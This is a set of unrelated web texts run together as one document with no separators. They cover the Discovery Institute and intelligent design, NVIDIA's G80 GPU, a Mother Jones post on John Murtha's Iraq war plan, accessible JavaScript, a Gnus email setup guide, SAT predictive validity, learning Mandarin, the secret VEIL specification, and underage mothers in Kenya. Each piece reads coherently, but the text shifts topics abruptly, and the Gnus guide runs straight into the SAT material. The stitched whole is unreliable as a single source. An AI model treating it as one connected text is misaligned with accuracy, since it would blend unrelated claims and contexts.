NEARLY FORTY YEARS AGO , in 1966 , two talented young political thinkers published an extraordinary book , one that reads , in retrospect , as a profound warning to the Republican Party that went tragically unheeded .
The authors had been roommates at Harvard University , and had participated in the Ripon Society , an upstart group of Republican liberals .
They had worked together on Advance , dubbed “ the unofficial Republican magazine , ” which slammed the party from within for catering to segregationists , John Birchers , and other extremists .
Following their graduation , both young men moved into the world of journalism and got the chance to further advance their “ progressive ” Republican campaign in a book for the eminent publisher Alfred A. Knopf .
In their spirited 1966 polemic The Party That Lost Its Head , they held nothing back .
The book devastatingly critiqued Barry Goldwater ’s 1964 presidential candidacy — the modern conservative movement ’s primal scene — and dismissed the GOP ’s embrace of rising star Ronald Reagan as the party ’s hope to “ usurp reality with the fading world of the class - B movie . “
Read today , some of the most prophetic passages of The Party That Lost Its Head are those that denounce Goldwater ’s conservative backers for their rampant and even paranoid distrust of the nation ’s intellectuals .
The book labels the Goldwater campaign a “ brute assault on the entire intellectual world ” and blames this development on a woefully wrongheaded political tactic :
“ In recent years the Republicans as a party have been alienating intellectuals deliberately , as a matter of taste and strategy . “
The authors charge that Goldwater ’s campaign had no intellectual heft behind it whatsoever , save the backing of one think tank , the American Enterprise Institute , which they denounce as “ an organization heavily financed by extreme rightists . ”
Continuing in the same vein , they slam William F. Buckley , Jr. , for his attacks on leading universities and describe the advent of right - wing anti-intellectualism as “ crippling ” to the Republican Party .
The book further deplores conservatives ’ paranoid distrust of the “ liberal ” media and the “ Eastern Establishment , ” and worries that without the backing of intellectuals and scholars , the GOP will prove unable to develop “ workable programs , distinct from those of the Democrats and responsive to national problems . ”
If the party wants to win back the “ national consensus , ” the authors argue , it must first win back the nation ’s intellectuals .
Clearly , The Party That Lost Its Head failed in its goal of prompting a broad Republican realignment .
The GOP went in precisely the opposite direction from the one these young authors prescribed — which is why the anti-intellectual disposition they so aptly diagnosed in 1966 still persists among many modern conservatives , helping to fuel the current crisis over the politicization of science and expertise .
In fact , the chief difference between the Goldwater conservatives and those of today can often seem more cosmetic than real .
A massive number of think tanks have now joined the American Enterprise Institute on the right , but in many cases these outlets still provide only a thin veneer of intellectual respectability to ideas that mainstream scholarship rejects .
Certainly , the proliferation of think tanks has not had as a corollary that conservatives now take scientific expertise more seriously .
On the contrary , the Right has a strong track record of deliberately attempting to undermine scientific work that might threaten the economic interests of private industry .
Perhaps more alarmingly still , similar tactics have also been brought to bear by the Right in the service of a religiously conservative cultural and moral agenda .
The next three chapters demonstrate how cultural conservatives have disregarded , distorted , and abused science on the issues of evolution , embryonic stem cell research , the relation of abortion to health risks for women , and sex education .
In the process , we will encounter more ideologically driven think tanks , more questionable science , and more conservative politicians willing to embrace it .
The story begins , however , with a narrative that cuts to the heart of the modern Right ’s war on science .
You see , despite the poignant accuracy of their critique , the authors of The Party That Lost Its Head — Bruce K. Chapman and George Gilder — have since bitten their tongues and morphed from liberal Republicans into staunch conservatives .
In fact , you could say that they have become everything they once criticized .
Once opponents of right - wing anti-intellectualism , they are now prominent supporters of conservative attacks on the theory of evolution , not just a bedrock of modern science but one of the greatest intellectual achievements of human history .
With this transformation , the modern Right ’s war on intellectuals — including scientists and those possessing expertise in other areas — is truly complete .
Three decades ago , no one could have guessed that Bruce Chapman — who did not respond to interview requests for this book — would wind up at the helm of a religiously inspired crusade against evolution .
After the publication of The Party That Lost Its Head , Chapman carried on his liberal Republican campaign through his involvement in Washington state politics .
Elected to the Seattle city council in 1971 , he later became secretary of state of Washington and made an unsuccessful stab at the governorship in 1980 , running to the left of conservative Democrat ( and later ozone depletion denier ) Dixy Lee Ray .
( Both Chapman and Ray lost in their respective primaries . )
Throughout this period , evolution historian and Chapman acquaintance Edward J. Larson has noted , Chapman was a moderate “ Rockefeller Republican ” to the core .
That changed , however , when Chapman entered the Reagan administration in 1981 as director of the Census Bureau .
In a Washington atmosphere in which Reagan himself catered to antievolutionist religious leaders like Jerry Falwell , Chapman moved to the right relatively quickly .
Indeed , in Chapman ’s transformation into a conservative who would absurdly declare evolution a “ theory in crisis , ” which he did in 2003 , one can trace key trends in the development of the modern conservative movement , such as the rising influence of the religious Right and the launch of an array of ideological think tanks .
Among the latter must certainly be counted Seattle ’s Discovery Institute , where Chapman currently serves as president and where George Gilder — who underwent a similar ideological transformation , becoming a supply - side economics guru — now serves as a senior fellow .
By June 4 , 1983 , Chapman could be found publicly condemning liberalism for its “ shabby , discredited , sophistical values ” and defending “ traditional morality . ”
In an article on the “ Harvard - trained former liberal , ” the New York Times even singled out Chapman ’s political shift as emblematic of “ a converging of the intellectual left with the religious right within the [ Republican Party ] under the Reagan banner . ”
Chapman soon left the Census Bureau to work in the White House under Reagan adviser ( and later antipornography crusading attorney general ) Edwin Meese .
“ I have become more conservative as I have grown older , ” he observed at the time .
As the 1980s ended , Chapman initially seemed to veer away from his newfound social conservatism .
In the early days of the Discovery Institute — which originated as a Seattle branch of Indianapolis ’s center - right Hudson Institute — he drew heavily on connections from his moderate Seattle past .
The Institute ’s first slate of directors read “ like the guest list for a gathering of liberal Republicans , ” noted Seattle Times columnist Herb Robinson in 1991 .
Originally , Discovery focused on issues like the economic competitiveness of Seattle and telecommunications policy .
The vibe was forward - looking , futuristic , and intellectually contrarian .
Yet much as Chapman himself swung to the right during the Reagan years , Discovery too has turned to religious conservatism .
In recent years , it has become home to a reactionary crusade against the theory of evolution that goes under the banner of “ intelligent design ” ( ID ) .
Bringing creationism up to date , ID proponents insist that living organisms show detectable signs of having been designed ( that is , specially created ) by a rational agent ( presumably God ) , while denouncing “ Darwinism ” for inculcating atheism and destroying cultural and moral values that had previously been grounded in piety .
Such arguments put the ID campaign squarely at the center of a religiously driven culture war , and Chapman has described ID as the Discovery Institute ’s “ No. 1 project . ”
His friend Gilder , meanwhile , has ridiculously pronounced that “ the Darwinist materialist paradigm . . . is about to face the same revolution that Newtonian physics faced 100 years ago . “
Such declarations appear to have made more moderate Republicans rather uncomfortable .
During a November 2004 science journalism conference in Seattle , I had the opportunity to ask former EPA administrator William Ruckelshaus , who once sat on the Discovery Institute ’s board , what he thought of its antievolutionist activities .
Ruckelshaus told me he had n’t been interested in being involved in such a project .
( In fact , in a 2000 speech on how to save the Pacific salmon , posted on the Discovery Institute ’s website , Ruckelshaus called the fish “ a marvel of evolutionary adaptation . “ )
Clearly , Bruce Chapman has presided over an uncomfortable merger between pragmatic , centrist Republicanism and the antievolutionist , culture - warrior wing of the Right .
Today , Discovery touts Cascadia , a technology - intensive project to improve transportation in the Pacific Northwest that is funded in part by the Microsoft fortune ( through the Bill and Melinda Gates Foundation ) even as it seeks to replace one of the cornerstones of biology with what Wired magazine has labeled the 2.0 version of creationism .
And Chapman — a man who by all accounts cares deeply about ideas and whom the New York Times once called “ serious and scholarly “ — has morphed into a leader of the nation ’s most prominent religious crusade against modern science .
Intelligent design , as advanced by the Discovery Institute , has many antecedents .
An older and more explicitly theological version of the idea holds that the universe itself shows evidence of God ’s handiwork , a claim that science — which is limited by its methodology to studying natural causes , not allegedly supernatural phenomena — can neither confirm nor refute .
Similarly , before the publication of Charles Darwin ’s
On the Origin of Species by Means of Natural Selection in 1859 , many , indeed most , educated men and women accepted the precepts of “ natural theology , ” an argument by analogy that just as human artifacts like watches show signs of a designer ’s hand , so do specialized organs like the eye .
Perhaps the most famous proponent of this argument was the Reverend William Paley , author of the 1802 work Natural Theology .
Darwin read ( and was impressed by ) Paley as a young student at Cambridge .
His Origin , however , unfolds as an elaborate rebuttal to Paley ’s recourse to divine intervention , explaining how complex organs could have evolved through gradual stages from imperfect but still useful antecedents , or from simpler structures that were co-opted for new uses .
As Darwin noted in a famous passage from the book ’s second edition :
To suppose that the eye , with all its inimitable contrivances for adjusting the focus to different distances , for admitting different amounts of light , and for the correction of spherical and chromatic aberration , could have been formed by natural selection , seems , I freely confess , absurd in the highest possible degree .
Yet reason tells me , that if numerous gradations from a perfect and complex eye to one very imperfect and simple , each grade being useful to its possessor , can be shown to exist ; if further , the eye does vary ever so slightly , and the variations be inherited , which is certainly the case ; and if any variation or modification in the organ be ever useful to an animal under changing conditions of life , then the difficulty of believing that a perfect and complex eye could be formed by natural selection , though insuperable by our imagination , can hardly be considered real .
Providing the linchpin of modern biology , Darwin ’s work supplanted natural theology ’s argument from design and left it by the wayside , at least from a scientific standpoint .
Representatives of Bruce Chapman ’s think tank , however , have plucked the design argument from the annals of intellectual history and pronounced it modern science .
Granted , today ’s technophile ID advocates dress up their arguments “ in the idiom of information theory , ” as leading ID proponent William Dembski has put it , claiming ( for instance ) that the massive amounts of biological information encoded in DNA could not have arisen through natural selection and must therefore have been designed by an intelligent agent .
But judging from ID ’s poor scientific publication record , it has failed to convince working biologists to join in this quixotic enterprise .

Today , NVIDIA launched their new graphics processor , the GeForce 8800GTX .
The 8800 is getting rave reviews ( see the links below ) , and on many benchmarks it even outperforms two ATI graphics cards in a Crossfire rig .
In fact , the 8800GTX ( 575MHz core clock , 768 MB of GDDR3 at 900M Hz ) spanks the competition handily in spite of the fact that drivers for the GPU are in a pretty green state at the moment .
One look at the benchmarks will show you that the 8800 represents a major advance in graphics performance , so you 're probably wondering how NVIDIA pulled it off .
In short , the 8800 derives its performance gains from a brand new architecture that 's different in some fundamental ways from previous GPU architectures .
The G80 architecture that powers NVIDIA 's new G8800 graphics processor has been four years in development , and its new - from - the - ground - up design marks a significant departure from previous PC GPUs .
The G80 is the first in a coming wave of DirectX 10 - compatible cards that offer a unified shader model of the kind that has previously only been available to gamers in the form of the Xbox 360's ATI - designed Xenos GPU .
I 'm still poring over NVIDIA 's presentation materials and trying to get a good handle on exactly what the company has done with the G80 , so I 'll only briefly review the major advances of the design from a " big picture " perspective .
Some time ago , NVIDIA hosted a conference call in response to a pair of announcements from ATI and Peakstream in the area of stream processing .
The company was coy about what they were up to , and all they 'd say is that their project was n't like what either Peakstream or AMD / ATI are now doing .
The Peakstream and AMD / ATI approaches were , in the words of the NVIDIA spokesperson , " like putting lipstick on a pig " — they were taking the existing GPU architecture and bolting on a software layer of abstraction that 's intended to hide its graphics - specific nature while exposing its stream processing functionality .
NVIDIA countered that they had an announcement in the pipeline about a new type of product that 's different from both a hardware and a software perspective , but they would n't say much more than that .
The G80 as a stream processor
The 8800 is clearly the product they were talking about ; it 's actually built from the ground up as a highly multithreaded , general - purpose stream processor , with the GPU functionality layered over it in software .
This is the reverse of existing general - purpose GPU ( GPGPU ) approaches .
So with the G80 , a programmer can write a stream program in a regular high - level language ( HLL ) that compiles directly to the stream processor , without the additional overhead that goes along with translating HLL programs into a graphics - specific language like OpenGL's GLSL .
( If you 're not sure what a " stream processor " is , or if what I just said confuses you , be sure to stop right now and go read this article for background on the concepts I 'm covering here . )
Ideally , a program for the G80 would consists of hundreds of stream processing threads running simultaneously on the GPU 's many arrays of tiny , scalar stream processors .
These threads could do anything from graphics and physics calculations to medical imaging or data visualization .
Making a fully generalizable stream processor like the G80 required NVIDIA to include a feature that graphics programmers have desired for as long as they 've wanted a unified shader model : a hardware virtual memory implementation for the GPU that enables seamless access to main memory for GPU - based programs .
Virtual register files and virtual memory
From what I can tell , the G80 has a multilevel parallel data cache ( L1 and L2 caches , shared among stream processor clusters ) that pages data in and out from main memory , just like a regular processor 's virtual memory implementation .
However , the L1 cache level is n't like a typical CPU 's L1 cache .
In fact , it may be more like the local store of Cell 's SPUs .
Here 's how it seems to work .
From a higher level , the G80's execution hardware has eight of what I 'll call " tiles , " for lack of a handy , NVIDIA - supplied word .
Each tile consists of two groups of eight stream processors , for a total of 16 stream processors per tile .
Each tile also has some thread - fetching hardware for managing instruction flow through the different stream processors , and a chunk of scratch memory that NVIDIA has labeled " L1 cache " in their diagrams .
This " L1 cache " is a " parallel data cache , " and their diagrams suggest that this cache is carved up into sixteen blocks , one for each stream processor .
( Note to the people who do these illustrations for NVIDIA : settle on one color for functional units , one for memory , one for groups of functional blocks , etc .
Then , keep the same color in all the diagrams throughout the presentation .
So all of the orange in the diagram above should actually be green , and all of the L1 should be orange instead of gray . )
Each of these 16 blocks acts as a giant , 4,000 - entry virtual register file for a stream processor in the tile .
Each SP can read from and write to this virtual register file as it executes a thread , with the result that the G80 can perform in one pass the kind of inter-element vector arithmetic operations that required multiple passes on previous GPUs .
The hardware also provides support for load / store access between main memory and this virtual register file , which is why it 's a bit like the Cell processor 's local store .
Finally , this virtual register file is automatically backed by an L2 and , ultimately , by DRAM .
Because the register file contents can be paged out to DRAM , this means that the CPU can access the results of a stream computation with a simple memory read .
Separating out the display hardware
It 's worth noting that the G80 chip , by itself , does n't have the hardware necessary to output an image to the display .
Instead , it sends output to a separate chip on the graphics card , which has the hardware needed to drive an DVI or analog VGA display .
In the case of the G80 , this hardware was probably put on a separate chip because the G80 chip itself is already really huge .
It could also be the case , though , that they eventually plan to gang together multiple G80 chips onto a single graphics card ( after a die shrink to 65nm , probably ) and have all of the chips feed data into the same display driver hardware .
This is the kind of thing that AMD / ATI will do when they eventually drop a GPU into a cHT socket .
There will be an DVI display driver chip somewhere else on the motherboard , and the GPU will write to that so that its output can be displayed on - screen .
Conclusions
Take a look at the benchmarks in the " Further Reading " section below , and you 'll see that the 8800 has debuted today at the very top of the graphics market .
AMD / ATI will be playing catch - up to this ( and they will catch up ) , but this holiday season hardcore gamers will go to sleep on Christmas Eve hoping to wake up to an 8800 under the tree .
Hopefully , Santa has $ 599 laying around for the top - end GTX model .
The 8800 not only offers a leap in graphics performance and image quality , but it also promises to give more indigestion to a certain dedicated physics processing unit company .
Programmers will be able to write gameplay - affecting physics code in C , and have it run on the G80 .
NVIDIA has more than just gamers in mind for the 8800 , though .
They 're targeting the same high - performance computing ( HPC ) markets as the other stream processing solutions from AMD / ATI and Peakstream .
It 's worth noting that Intel is n't resting on its laurels in this regard , either .
I eagerly await news of what they 're up to in the area of graphics , CPU / GPU integration , and stream processing .

For indispensable reporting on the coronavirus crisis , the election , and more , subscribe to the Mother Jones Daily newsletter .
Details are creeping out about Congressman John Murtha ’s plan to put the clamps on the Iraq War ( featured today on the Mother Jones News and Politics page ) , but I think many people lack a clear understanding of how the plan works .
The idea is to pass a series of small measures that curtail the president ’s ability to make war , while at the same time showing support the troops .
This is seen as more likely to get through the House and Senate than a proposal to cut off funding for the war and is more politically advantageous for the Democrats .
Here ’s specifically what Murtha ’s plan would do :
(1) It would not allow American troops to deploy to Iraq unless they meet certain ( very high ) standards of manpower , equipment , and training .
Murtha believes few of the units Bush intends to use for the surge would be able to meet his requirements .
(2) It will limit the length and number of deployments by soldiers in the American armed forces , thereby making it more difficult for the Pentagon to replace troops it rotates out of war zones .
(3) It will mandate that troops get a year off in between stints at the front lines .
(4) It would end the construction of enduring bases in Iraq .
(5) It would raze Abu Ghraib .
When taken together , the plan would limit the number of troops Bush has to work with , while blunting conservative criticism that the Democrats are anti-military or anti-troops .
The plan will be attached to an upcoming $ 93 billion supplemental spending bill that is needed to pay for Iraq and Afghanistan .
Murtha controls the progress of that bill as chairman of the House defense appropriations subcommittee .
In effect , if you are n’t willing to support Murtha ’s plan , you are forced to vote against funding the troops .
Not a good position for a Republican lawmaker to be in .

Following my Avoiding Evil JavaScript editorial last issue , I got a great deal of contradictory feedback .
It ’s not surprising , given the strong opinions that people tend to have about accessibility and its importance on the Web .
Nevertheless , before I show you some easy and practical ways to write better JavaScript , I ’d like to clear up one common misunderstanding that I found in some of that feedback .
JavaScript itself is not evil , nor are the web sites and applications that provide a slick , enhanced user experience using JavaScript .
What I call “ evil ” is the use of JavaScript in such a way that it needlessly prevents some users from being able to access the site or application .
It ’s usually not only possible but quite practical to build your slick , JavaScript - powered user experience on a foundation of standard HTML and CSS .
This foundation enables you to deliver your site ’s content not only to users browsing with JavaScript disabled , but also to automated systems like search engines .
With a little extra thought , you can even make your JavaScript functionality play nicely with assistive technologies , and work well for keyboard - only users .
But things start to fall apart when Ajax enters the picture , and users begin clamoring for the desktop - like applications that it makes possible .
Often , static HTML / CSS is not up to the task of providing a useful foundation for these apps , and building a non-Ajax alternative would be a completely separate project — probably one that you ca n’t justify the cost of developing and maintaining .
In extreme cases , it ’s possible that what your application does simply does n’t translate to the page - based model of plain HTML .
The solution to this dilemma , in my mind , is to separate these types of applications from the current , page - based Web , and move them to a “ Web of Applications ” that ’s just as universally available as the Web is now , but which is designed from the ground up with applications in mind , and solves all the issues that are currently being caused by our attempts to shoehorn desktop - like applications into a system that was designed for serving pages of information .
This “ Web of Applications ” could be as simple as a new URL protocol ( hatp:// for HyperApplication Transfer Protocol ? ) or MIME type that would be recognized by browsers , and in fact a number of vendors have attempted ( or are planning to attempt ) exactly this :
Meanwhile , the W3C is also working on this problem through the Web Application Formats Working Group .
So far , every one of these initiatives has failed to attract widespread adoption because it required the installation of some specific piece of software in addition to a web browser ( in the case of XUL , it required a specific web browser ) .
Unless they can achieve the same ubiquity as HTML , CSS , and JavaScript , desktop - like applications masquerading as web pages will remain the more popular — and problematic — choice .
So , in the absence of a suitably ubiquitous platform for desktop - like applications , do Ajax - powered desktop - like web applications fall under the umbrella of “ Evil JavaScript ? ”
Personally I think they do , but depending on your particular situation , they might be a necessary evil .
The evolution of web technology marches on , but as developers we need to do the best we can with the technology and resources at our disposal today .
The most important thing , in my books , is that you make sure you ’re well informed before you make a decision that might prevent some users from accessing your site .

February 4 , 2007 — jao
I ’ve spent part of the morning setting up Gnus on my OS X , to replace Mail.app and ease synchronization with my GNU / Linux boxes .
I wo n’t enter in the details of basic Gnus setup ( see , for instance , the Gnus tutorial ) , but offer some customization tips , and mention two of my favourite Gnus - enhancing packages ( which are not OS X - specific , by the way ) .
First thing was to import my Mail.app mailboxes .
Easy .
Open the mailbox in Mail , select all messages and execute the menu command Save as ... ( under File ) ; in the save dialog , be sure to select Raw Message Source .
The saved file is in mbox format , a Gnus import friendly one .
All you need to get those messages into Gnus is to press B f in the * Group * buffer , providing your mbox file when asked .
A new group is created with all your messages .
You can , for instance , mark all of them and B c to copy them in , say , a regular nnml group .
Setting Gnus to read and send messages via Gmail was also easy following the instructions here .
A caveat : you ’ll need also the file ssl.el from the Gnus CVS repository to make POP3 work ( and of course gnutls , which i installed via the fink package gnutls 14 ; be sure to tell Emacs about your fink path : ( add - to - list ' exec - path " / sw/ bin " ) ) .
With that , I had a functional Gnus running and could move on to more interesting stuff .
I do n’t know about you , but i absolutely need random mail signatures , selected from my growing collection .
To that end , i’ve been using randomsig.el since i can remember .
Just put the file in your load path ( or , if you ’re on Debian , install the gnus - bonus - el package ) , and add to your initialisation files something along the lines of :
( when ( require ' randomsig nil t ) ( define - key message - mode - map ( kbd " C-c s " ) ' randomsig-replace - sig ) ( define - key message - mode - map ( kbd " C- c S " ) ' randomsig-select-sig ) ( require ' gnus- sum ) ; probably required for `gnus - summary - save - map ' ( define - key gnus - summary - save-map " - " ' gnus/randomsig-summary - read - sig ) ( setq randomsig - dir " ~/ Library / Emacs / Gnus / " ) ( setq randomsig - files '( " signatures.txt " ) ) ;; or ( setq randomsig - files ( randomsig - search - sigfiles ) ) ;; or ( setq randomsig - files ' randomsig-search - sigfiles ) ( setq message - signature ' randomsig- signature ) ( setq randomsig - delimiter - pattern " ^ -- " ) )
As you can see , i put my signatures in a file called signatures .
txt .
Now , every time i start editing an email , a random signature taken from this file is inserted for me .
If i do n’t like it , i can request another one typing C-c s .
And if i’m reading anything inside and Emacs buffer and find a new text to add to my signatures .
txt , M-x randomsig - message - read - sig will add the region marked in the buffer to my collection .
Perfect bliss .
Mail.app comes with a sophisticated search engine based on Spotlight .
But i’ve noticed that i never use the 95 % of its features , not to mention that it ’s annoyingly slow .
What i really need is a simple and quick keyword search , and i’ve had it for many years now with Gnus and nnir.el .
This package provides an Emacs / Gnus front - end to several indexers , my preferred one being namazu .
So , besides getting nnir.el , you ’ll need to install it .
In Debian , it ’s as easy as installing the corresponding package ( namaz u2 ) , but , theres no namazu package to be seen in fink .
Fortunately , you can compile it from source just by following the instructions : they worked in my MacBook without a glitch .
With namazu installed , you can index your extant email in a breeze : create a directory to hold the index files ( i use ~/ Library / Caches / namazu ) and type :
cd ~/ Library / Caches / namazu mknmz -- mailnews ~/Library / Emacs/Gnus/Mail
( using the appropriate directories , of course ) , and the index directory will get populated .
Now , with nnir.el in your load path , tell Emacs how to find those index files :
( when ( require ' nnir nil t ) ( setq nnir - search - engine ' namazu ) ( setq nnir - namazu - index - directory ( expand - file - name " ~/ Library / Caches /namazu " ) ) ( setq nnir - namazu - remove - prefix ( expand - file - name " ~/ Library / Emacs/Gnus / Mail / " ) ) ( setq nnir - mail - backend ( nth 0 gnus - secondary - select - methods ) ) )
( i put this code in my Gnus configuration file ) .
We are all setup : go to the * Group * buffer and type G G to search your emails .
A temporal group containing the messages that match your query will be created for you , for your browsing pleasure .
Inside that group , G T will teletransport you to the original message , in case you need to recover its context .
As you ’ll notice , namazu searches are at least an order of magnitude faster than Spotlight .
The only bit left is to set an entry in your crontab running mknmz for you periodically ( i’ve got it set up with a period of one hour ) .
Indexing is incremental , i.e. , fast .
Yeah , it ’s not that immediate indexing of Spotlight or Beagle , but , you know , it ’s not like i get a mail every five seconds , or that i need engine to find a mail i read twenty minutes ago .
There are many other tricks to play with Gnus , but i’ll save them for future posts :-) .
The SAT I is designed to predict first - year college grades - it is not validated to predict grades beyond the freshman year , graduation rates , pursuit of a graduate degree , or for placement or advising purposes .
However , according to research done by the tests ' manufacturers , class rank and / or high school grades are still both better predictors of college performance than the SAT I .
How well does the SAT I predict first - year college grades ?
The College Board and ETS conduct periodic studies of the SAT I .
This usually involves examining the relationship between test scores and first - year college grades , generally expressed as the correlation coefficient ( or r value ) .
The College Board 's Handbook for the SAT Program 2000 - 2001 claims the SAT-V and SAT-M have a correlation of .47 and .48 , respectively , with freshman GPA ( FGPA ) .
This number is deceptive , however .
To determine how much of the difference in first - year grades between students the SAT I really predicts , the correlation coefficient must be multiplied by itself .
The result , called r squared , describes the difference ( or variation ) among college freshman grades .
Thus , the predictive ability ( or r squared ) of the SAT I is just .22 , meaning the test explains only 22 % of the variation in freshman grades .
With a correlation of .54 , high school grades alone do a better job , explaining almost 30 % of the variance in first - year college performance .
What do the SAT I validity studies from major colleges and universities show ?
WHO , WHAT , WHY ?

Mandarin and Cantonese are spoken in China
China used to be called a sleeping giant .
Now , as the world 's fastest growing major economy , it is well and truly awake .
British exports to the country are expected to quadruple by the end of the decade and the government wants every school , college and university to be twinned with an equivalent in China within the next five years .
An estimated 100 schools in the UK are now teaching Mandarin , China 's official language , according to the British Council - the UK 's international organisation for educational and cultural relations .
Compulsory
Brighton College , an independent school in East Sussex , this week became the first to make the language compulsory , alongside French , Spanish and Latin .
But it is a tough language to learn for Westerners .
There are two main reason for this , says Dr Frances Weightman , a lecturer in Chinese Studies at the University of Leeds .
Firstly , the script poses problems .
There is no alphabet , just thousands of characters .
There are so many that no one can give a definitive total , but it is believed to be around 60,000 .
GETTING THE RIGHT TONE
Tone one - A fairly high , even tone Tone two - A rising tone , much like the sound at the end of a sentence with a question mark
Tone three - Falls then rises .
Like the second , but must dip first Tone Four - Sharp falling tone , a little like how the end of a sentence with an exclamation mark sounds
Half tone - Pronounce words with light tones in about half the time you would a normal word , without putting emphasis on it
College makes Chinese compulsory
Four - and - a - half tones are used , meaning a single word can have many meanings .
Ma , for example , can mean mother , horse , hemp , or be a reproach depending on tone .
How tones are used also varies extensively from province to province .
" The tonal systems can result in a lot of ambiguity for people learning the language , " says Dr Weightman .
Westerners have the reputation of using the fourth tone exclusively for all words .
It is a sharp falling sound , a little like how the end of a sentence with an exclamation mark sounds .
Pinyin , a system of transliterating Chinese characters into the Roman alphabet , is used by Westerners to learn basic Mandarin .
Things get tougher when students start learning characters , but language experts say a person only needs roughly 5,000 to be literate .
' It 's like singing '
One thing that is easier in Mandarin is the grammar .
" The grammar is not nearly as complicated as many European languages , " says Dr Weightman .
" For example there are no verb tenses , no relative clauses , no singular or plural . "
The number of people in the UK learning Mandarin has gone up considerably in recent years , she adds .
" It really appeals to kids , they find the different characters fun and grasp the different tones well , it 's like singing for them .
The more we demystify the language , the more people will learn it .
At the moment it is still seen as exotic and a bit strange , which can put people off .
But that 's changing . "
WHO , WHAT , WHY ?
A regular feature in the BBC News Magazine - aiming to answer some of the questions behind the headlines
Ann Martin , a Mandarin teacher at the Ashcombe School in Dorking Surrey , believes part of the problem is the exam system , which is n't designed for non native speakers and is hard for them to gain good grades compared to native speakers .
" As far as schools are concerned head teachers are reluctant to timetable Chinese because it is not achievable for non-native speakers , " she says .
Business experts are in no doubt about how important Mandarin will become over the next few years .
BBC business reporter Mary Hennock says students speaking fluent English and Chinese are going to be the executives of the future .
" China 's economy is growing so quickly and becoming so influential in the world economy that people can't afford to ignore it .
People who want to be ahead in whatever industry need to think about China and learning Chinese . "
I am learning Chinese , and find it fun .
So far , I have accidentally told someone I was pregnant ( by saying ' I have ..' ) , called my mum a horse , ( wrong tone ) , called my boss my wife ( wrong tone again ) , and told my girlfriend that I want to ' take advantage of my mum ' ( wo n't say that again in a hurry !! )...
Learn it - it 's a good laugh .
I 'm move to China next week to continue learning .... while I teach English there .
Gareth Williams , Cardiff , UK
I am ethnic Chinese myself , albeit born , raised and educated in Britain .
When a teenager , my parents belatedly decided to try and get me to take up Mandarin or Cantonese .
To say that I found it near impossible to master is an understatement ; ethnicity is no guarantee of ability !
Ivan Tan , London WC UK
I attempted to learn Mandarin Chinese whilst at college .
After the short four month course was over , I could remember how to say " thankyou " , and " I am a Japanese " .
It was just too hard for me to use Pinyin and pronounce the words correctly , as the tonal variations of the languages were hard to get right .
I now study Japanese , and it 's easier by far .
Claire B , Oxford , UK
Mandarin is not as hard as Cantonese which has nine tones .
And any mistake you make inevitably leads to a very rude slang expression .
simon , brighton
I think it is brilliant that schools are opening up to the thought of teaching what is perceived as a non -core subject .
Languages are a way forward , and are great stimulation for the brain , expecially in young children .
If Mandarin is a language of the future then I strongly believe that children should be given expsoure to this , even if this is a basic understanding , its still a good foundation to work from .
Anthony Colley , High Wycombe - Bucks
Westerners see learning Chinese as a preparation for the future , but I see it as a doom of traditional Chinese characters .
However , since simplified Chinese characters are taught throughout China , very few people will learn how to write traditional Chinese characters , which are the most precious cultural heritage for China .
Lynette , Taiwan , R.O.C .
Liked your article .
I 'm planning to live in China .
I 've studied Chinese 2 plus years .
I only know about 1000 characters and read about at the first grade elementry level .
I have a long way to go but am convinced it is a language worth learning .
I plan on using it for the next decade and beyond .

If you ’ve been reading here lately , you know that I ’m no fan of the Sensenbrenner / Conyers analog hole bill .
The bill would require almost all analog video devices to implement two technologies called CGMS - A and VEIL .
CGMS - A is reasonably well known , but the VEIL content protection technology is relatively new .
I wanted to learn more about it .
So I emailed the company that sells VEIL and asked for a copy of the specification .
I figured I would be able to get it .
After all , the bill would make compliance with the VEIL spec mandatory – the spec would in effect be part of the law .
Surely , I thought , they ’re not proposing passing a secret law .
Surely they ’re not going to say that the citizenry is n’t allowed to know what ’s in the law that Congress is considering .
We ’re talking about television here , not national security .
After some discussion , the company helpfully explained that I could get the spec , if I first signed their license agreement .
The agreement requires me ( a ) to pay them $ 10,000 , and ( b ) to promise not to talk to anybody about what is in the spec .
In other words , I can know the contents of the bill Congress is debating , but only if I pay $ 10 k to a private party , and only if I promise not to tell anybody what is in the bill or engage in public debate about it .
Worse yet , this license covers only half of the technology : the VEIL decoder , which detects VEIL signals .
There is no way you or I can find out about the encoder technology that puts VEIL signals into video .
The details of this technology are important for evaluating this bill .
How much would the proposed law increase the cost of televisions ?
How much would it limit the future development of TV technology ?
How likely is the technology to mistakenly block authorized copying ?
How adaptable is the technology to the future ?
All of these questions are important in debating the bill .
And none of them can be answered if the technology part of the bill is secret .
Which brings us to the most interesting question of all :
Are the members of Congress themselves , and their staffers , allowed to see the spec and talk about it openly ?
Are they allowed to consult experts for advice ?
Or are the full contents of this bill secret even from the lawmakers who are considering it ?

Many of the girls have sad stories about how they became pregnant
Mtondia , a small village in Kilifi district on the Kenyan coast is now considered a cursed village as so many of its young girls are either pregnant or have children .
Many have sad stories of how they became mothers at such tender ages .
" I was 10 - years - old when I got my first child - I was raped by some young men in our village , " says 13 - year - old Mahenzo .
" Then two years later while I was going to a local disco , I was raped and that 's how I got my second child . "
Fifteen - year - old Janet Menza , meanwhile , says she was enticed into a love affair by an older man .
This is happening because these girls and boys go to the same school and that is where they get influenced to engage in pre-marital sex
Mtondia resident Dama Charo
" I was in class eight when I got involved with the man ; our relationship went on smoothly with him until I became pregnant , " she told the BBC .
" That is when he disappeared from the village and left me with the baby . "
Mahenzo , Janet and about 800 other under - age mothers recently gathered in an open field to meet Health Minister Charity Ngilu to discuss their plight .
They greeted her with songs and dance as her four - wheel - drive car pulled in .
Those who attended the public meeting with two or more of their children were as young as 16 .
Moving
Most of the girls are unmarried and have to leave school without completing their education .
The rise in the numbers of under -age mothers in Mtondia has repeatedly been blamed on poor parenting and a breakdown of traditional family structures .
I feel very sad indeed to see such a thing happening in our country and we as a government have not done anything
Health Minister Charity Ngilu
But Dama Charo , whose daughter is a teenage mother , making her a grandmother at the age of 33 , does not support these claims .
" This is happening because these girls and boys go to the same school and that is where they get influenced to engage in pre-marital sex , " says Mrs Charo .
In the past , when a girl got pregnant her father would force her to get married to the man responsible , but now the man is able to desert the girl leaving her to nurse the pregnancy alone , she adds .
Such experiences recounted to Mrs Ngilu almost moved the minister to tears .
" I feel very sad indeed to see such a thing happening in our country and we as a government have not done anything , " Mrs Ngilu told the BBC .
She regretted that laws meant to protect children were not being implemented effectively .
This , she said , had led to the crisis facing families in Mtondia .
" Action must be taken against these men who are having sex with young girls and ruining their future , " Mrs Ngilu said .
Mtondia is 60 km from the coastal resort of Malindi and many of the absent fathers work in the tourist industry .
